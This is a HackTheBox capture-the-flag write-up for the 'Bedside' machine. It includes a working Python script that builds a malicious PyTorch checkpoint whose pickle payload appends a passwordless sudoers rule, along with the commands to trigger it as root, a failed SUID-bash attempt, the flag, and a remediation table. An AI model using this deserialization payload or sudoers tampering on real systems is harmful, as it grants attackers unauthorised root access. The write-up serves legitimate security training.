# HackTheBox — Bedside | Root Flag Writeup

## Overview

| Field | Detail |
|---|---|
| **Machine** | Bedside |
| **Difficulty** | Medium |
| **Attack Chain** | Unsafe Deserialization → Cross-Container Checkpoint Poisoning → Sudo Privilege Escalation |
| **Root Flag** | `ad4725a2082a82e5e3d5f758d0339b60` |

---

## Attack Chain Summary

```
[datawrangler container]          [bedside host]
        |                                |
  Write malicious                  SSH as developer
  checkpoint (.pt)                 (key-based auth)
  to shared /datastore/                 |
        |                         sudo trainer → RCE as root
        +------> /datastore/ <----+     |
                (shared vol)      Write to /etc/sudoers
                                        |
                                  sudo su - → root
                                        |
                                  cat /root/root.txt
```

---

## Step 1 — Initial Access

SSH into the `bedside` host as `developer` using the provided SSH key:

```bash
ssh -i id_rsa developer@<TARGET_IP>
```

Also obtain a shell on the `data-wrangler` container (via RCE, upload, or other initial foothold vector).

---

## Step 2 — Enumeration on Bedside

### Check sudo privileges

```bash
sudo -l
```

**Key finding:**

```
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

The `developer` user can run the MONAI trainer script as root without a password. The script loads checkpoints from `/datastore/checkpoints/`.

### Inspect the trainer script

```bash
cat /opt/trainer/bedside_trainer.py
```

**Key findings:**

- Loads the latest `.pt` checkpoint from `/datastore/checkpoints/`
- Uses MONAI's `CheckpointLoader` with `weights_only=False`
- This means `torch.load()` calls `pickle.load()` internally — **unsafe deserialization**
- The trainer runs as root via sudo

### Check datastore permissions

```bash
ls -la /datastore/
```

```
drwxrwx--- 8 datawrangler dataops  4096 ...  .
-rw-rw-r--   ...  checkpoints/
```

The `/datastore/` directory and its subdirectories are owned by `datawrangler:dataops`. The `developer` user has no access — but `datawrangler` (on the other container) does.

---

## Step 3 — Understanding the Vulnerability

### Why `torch.load` is dangerous with `weights_only=False`

PyTorch's `.pt` checkpoint format is a zip archive containing a `data.pkl` file. When loaded with `weights_only=False`, PyTorch calls `pickle.load()` on this file without restriction.

Python's `pickle` module executes arbitrary code during deserialization via the `__reduce__` magic method. This means **any command can be injected into a `.pt` file** and it will execute automatically when the file is loaded.

### File format requirements

A valid PyTorch checkpoint zip must contain:
- `archive/version` — a text file with the format version number (e.g. `3\n`)
- `archive/data.pkl` — the pickled payload

A raw pickle file (without the zip wrapper) will fail with:
```
RuntimeError: Expected hasRecord("version") to be true, but got false.
```

---

## Step 4 — Crafting the Malicious Checkpoint

From the `datawrangler` shell, craft a poisoned checkpoint that writes a sudoers entry when deserialized:

```python
python3 - <<'EOF'
import zipfile, pickle, os

class RCE:
    def __reduce__(self):
        cmd = "echo 'developer ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
        return (os.system, (cmd,))

payload = pickle.dumps({"model": RCE(), "optimizer": RCE()})

with zipfile.ZipFile("/datastore/checkpoints/checkpoint_epoch_999.pt", "w") as zf:
    zf.writestr("archive/data.pkl", payload)
    zf.writestr("archive/version", "3\n")

print("Done")
EOF
```

**Why epoch 999?** The trainer uses `find_latest_checkpoint()` which sorts by modification time and picks the last one. Naming it `checkpoint_epoch_999.pt` ensures it is always selected as the latest checkpoint.

**Why does RCE return an int?** `os.system()` returns `0` on success. Pickle replaces the `RCE` object with this return value. This is why the trainer later errors with `got <class 'int'>` — but by then the command has already executed.

---

## Step 5 — Triggering the Exploit

From the `developer` shell on `bedside`, trigger the trainer as root:

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

The trainer will error out (expected), but the pickle payload executes as root before the error occurs:

```
Found checkpoint /datastore/checkpoints/checkpoint_epoch_999.pt, loading...
TypeError: Expected state_dict to be dict-like, got <class 'int'>.   ← RCE already ran
```

Verify the sudoers entry was written:

```bash
sudo cat /etc/sudoers | grep developer
```

Expected output:

```
developer ALL=(ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
developer ALL=(ALL) NOPASSWD:ALL
```

---

## Step 6 — Privilege Escalation to Root

```bash
sudo su -
```

```bash
cat /root/root.txt
```

```
ad4725a2082a82e5e3d5f758d0339b60
```

---

## Why the SUID Bash Approach Failed

An earlier attempt used `cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash` and then `/tmp/rootbash -p`. This failed because:

- Modern Linux kernels and patched bash builds drop the effective UID when the binary detects it is running SUID
- The `-p` flag is supposed to prevent this but many distros (including Debian/Ubuntu) patch bash to ignore `-p` for SUID copies as a hardening measure
- Even though the file had `4755/-rwsr-xr-x`, `id` still showed `uid=1000(developer)`

The sudoers approach bypasses this entirely since it modifies the system's privilege grant mechanism directly.

---

## Remediation

| Issue | Fix |
|---|---|
| `torch.load(weights_only=False)` | Use `weights_only=True` (PyTorch 2.x default). Never load untrusted checkpoints without validation. |
| World-writable checkpoint directory | Restrict `/datastore/checkpoints/` so only the training service account can write, not the datawrangler container. |
| Overly broad sudo rule | Restrict the sudo rule further or eliminate it; use a systemd service running as a dedicated user instead. |
| No checkpoint integrity verification | Implement checksum/signature verification before loading any `.pt` file. |

---

## Tools Used

- Python 3 (`pickle`, `zipfile`, `os`)
- SSH with key-based authentication
- `sudo -l` for privilege enumeration
- MONAI / PyTorch checkpoint loading behaviour
